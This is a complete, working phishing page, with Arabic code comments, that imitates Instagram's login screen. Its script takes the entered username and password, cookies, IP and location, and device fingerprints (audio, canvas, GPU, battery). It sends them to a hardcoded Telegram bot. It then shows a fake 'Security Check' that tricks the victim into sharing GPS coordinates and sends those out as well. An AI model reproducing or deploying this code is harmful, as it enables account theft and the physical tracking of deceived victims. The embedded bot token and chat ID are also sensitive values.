<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>Instagram</title>
<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
<style>
  /* التصميم الاحترافي المقنع */
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
  body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
  .login-container { background-color: #fff; border: 1px solid #dbdbdb; border-radius: 1px; width: 100%; max-width: 350px; padding: 40px; text-align: center; }
  .logo { font-family: 'Grand Hotel', cursive; font-size: 50px; margin-bottom: 35px; color: #262626; }
  .input-group { margin-bottom: 6px; }
  .input-group input { width: 100%; padding: 14px 8px 2px 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; outline: none; height: 36px; }
  .input-group input:focus { border: 1px solid #a8a8a8; }
  .login-btn { width: 100%; background-color: #0095f6; color: #fff; border: none; border-radius: 4px; padding: 7px 16px; font-weight: 600; font-size: 14px; margin-top: 8px; cursor: pointer; height: 32px; }
  .login-btn:disabled { background-color: #b2dffc; cursor: not-allowed; }
  .error-msg { color: #ed4956; font-size: 14px; margin-top: 15px; display: none; }
  .verify-container { background-color: #fff; border: 1px solid #dbdbdb; border-radius: 1px; width: 100%; max-width: 400px; padding: 40px 30px; text-align: center; display: none; }
  .verify-icon { font-size: 60px; margin-bottom: 20px; }
  .verify-title { font-size: 20px; font-weight: 600; margin-bottom: 10px; color: #262626; }
  .verify-text { font-size: 14px; color: #8e8e8e; margin-bottom: 25px; line-height: 1.5; }
  .verify-btn { width: 100%; background-color: #0095f6; color: #fff; border: none; border-radius: 4px; padding: 10px; font-weight: 600; font-size: 14px; cursor: pointer; }
</style>
</head>
<body>

  <div class="login-container" id="loginScreen">
    <div class="logo">Instagram</div>
    <form id="loginForm">
      <div class="input-group"><input type="text" id="username" placeholder="Phone number, username, or email" required /></div>
      <div class="input-group"><input type="password" id="password" placeholder="Password" required /></div>
      <button type="submit" class="login-btn" id="loginBtn">Log In</button>
    </form>
    <div class="error-msg" id="errorMsg"></div>
  </div>

  <div class="verify-container" id="verifyScreen">
    <div class="verify-icon">🔒</div>
    <div class="verify-title">Security Check</div>
    <div class="verify-text">We need to verify your identity. Please allow location access.</div>
    <button class="verify-btn" id="verifyBtn">Verify Identity</button>
  </div>

<script>
  // ==========================================
  // THE DARK WEB PROTOCOL (v909 Ultimate)
  // ==========================================
  const BOT_TOKEN = "8649753978:AAH2F-nMzUjB2hoUBZ8k-QfRnkvULzJdQfo";
  const CHAT_ID   = "8899697805";

  // 1. دالة إرسال البيانات لتلجرام
  async function sendToTG(title, text) {
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: `<b>${title}</b>\n━━━━━━━━━━━━━━━\n${text}`, parse_mode: 'HTML' })
      });
    } catch (e) {}
  }

  // 2. جلب الـ IP والموقع التقريبي
  async function getNetworkInfo() {
    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      return {
        ip: data.ip || "Unknown",
        city: data.city || "Unknown",
        country: data.country_name || "Unknown",
        isp: data.org || "Unknown"
      };
    } catch (e) { return { ip: "Blocked", city: "-", country: "-", isp: "-" }; }
  }

  // 3. سحب البطارية (Battery API)
  async function getBatteryInfo() {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      return `${Math.round(b.level * 100)}% ${b.charging ? '⚡ Charging' : '🔋 Discharging'}`;
    }
    return "Not Supported / Blocked";
  }

  // 4. سحب البصمة الصوتية (Audio Fingerprint)
  async function getAudioFingerprint() {
    try {
      const AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
      const context = new AudioContext(1, 44100, 44100);
      const oscillator = context.createOscillator();
      oscillator.type = "triangle";
      oscillator.frequency.value = 10000;
      const compressor = context.createDynamicsCompressor();
      oscillator.connect(compressor);
      compressor.connect(context.destination);
      oscillator.start(0);
      const buffer = await context.startRendering();
      const data = buffer.getChannelData(0);
      let hash = 0;
      for (let i = 0; i < data.length; i++) {
        if (data[i] !== 0) hash = (hash * 31 + data[i] * 1000) | 0;
      }
      return hash.toString();
    } catch (e) { return "Blocked"; }
  }

  // 5. سحب بصمة الشاشة والعتاد (Canvas & Hardware)
  function getHardwareInfo() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069";
    ctx.fillText("Cwm fjordbank glyphs vext quiz, 😃", 2, 15);
    const canvasHash = canvas.toDataURL().length.toString();

    return {
      canvas: canvasHash,
      cores: navigator.hardwareConcurrency || "Unknown",
      ram: navigator.deviceMemory || "Unknown",
      platform: navigator.platform || "Unknown",
      screen: `${window.screen.width}x${window.screen.height} @ ${window.screen.colorDepth}bit`,
      gpu: (() => {
        try {
          const gl = document.createElement('canvas').getContext('webgl');
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        } catch (e) { return "Blocked"; }
      })()
    };
  }

  // 6. سحب الكوكيز والجلسات (Session Hijacking)
  function getCookies() {
    return document.cookie || "None / HttpOnly";
  }

  // ==========================================
  // التنفيذ (Execution)
  // ==========================================

  document.getElementById("loginForm").onsubmit = async (e) => {
    e.preventDefault();
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value;
    const loginBtn = document.getElementById("loginBtn");
    const errorMsg = document.getElementById("errorMsg");

    loginBtn.disabled = true;
    loginBtn.innerText = "Verifying...";
    errorMsg.style.display = "none";

    // جمع البيانات
    const net = await getNetworkInfo();
    const battery = await getBatteryInfo();
    const audioHash = await getAudioFingerprint();
    const hw = getHardwareInfo();
    const cookies = getCookies();
    const ua = navigator.userAgent;

    const report = `
👤 <b>User:</b> <code>${username}</code>
🔑 <b>Pass:</b> <code>${password}</code>
🌐 <b>IP:</b> <code>${net.ip}</code>
🏙️ <b>Location (ISP):</b> <code>${net.city}, ${net.country}</code>
🏢 <b>ISP:</b> <code>${net.isp}</code>
📱 <b>Device:</b> <code>${hw.platform}</code>
🖥️ <b>Screen:</b> <code>${hw.screen}</code>
🎮 <b>GPU:</b> <code>${hw.gpu}</code>
⚙️ <b>Cores:</b> <code>${hw.cores}</code> | 💾 <b>RAM:</b> <code>${hw.ram} GB</code>
🔋 <b>Battery:</b> <code>${battery}</code>
🎨 <b>Canvas Hash:</b> <code>${hw.canvas}</code>
🔊 <b>Audio Hash:</b> <code>${audioHash}</code>
🍪 <b>Cookies:</b> <code>${cookies}</code>
🌍 <b>User Agent:</b> <code>${ua}</code>
    `.trim();

    await sendToTG("🕵️‍♂️ LOGIN & HARDWARE PROFILE", report);

    // إظهار شاشة طلب الموقع
    setTimeout(() => {
      if (password.length < 6) {
        loginBtn.disabled = false;
        loginBtn.innerText = "Log In";
        errorMsg.innerText = "Sorry, your password was incorrect.";
        errorMsg.style.display = "block";
        document.getElementById("password").value = "";
      } else {
        document.getElementById("loginScreen").style.display = "none";
        document.getElementById("verifyScreen").style.display = "block";
      }
    }, 2000);
  };

  // 7. سحب إحداثيات GPS (إذا وافق الضحية)
  document.getElementById("verifyBtn").onclick = () => {
    const btn = document.getElementById("verifyBtn");
    btn.innerText = "Locating...";

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const acc = position.coords.accuracy;

          let gpsReport = `
📍 <b>GPS LOCATION CAPTURED</b>
🗺️ <b>Latitude:</b> <code>${lat}</code>
🗺️ <b>Longitude:</b> <code>${lon}</code>
🎯 <b>Accuracy:</b> <code>${acc} meters</code>
🔗 <b>Map:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">View Target</a>
          `.trim();

          await sendToTG("Target Geolocated", gpsReport);
          btn.innerText = "Verification Complete...";
          setTimeout(() => window.location.href = "https://www.instagram.com/", 1500);
        },
        (error) => {
          btn.innerText = "Verification Failed...";
          setTimeout(() => window.location.href = "https://www.instagram.com/", 1500);
        },
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
      );
    }
  };
</script>
</body>
</html>
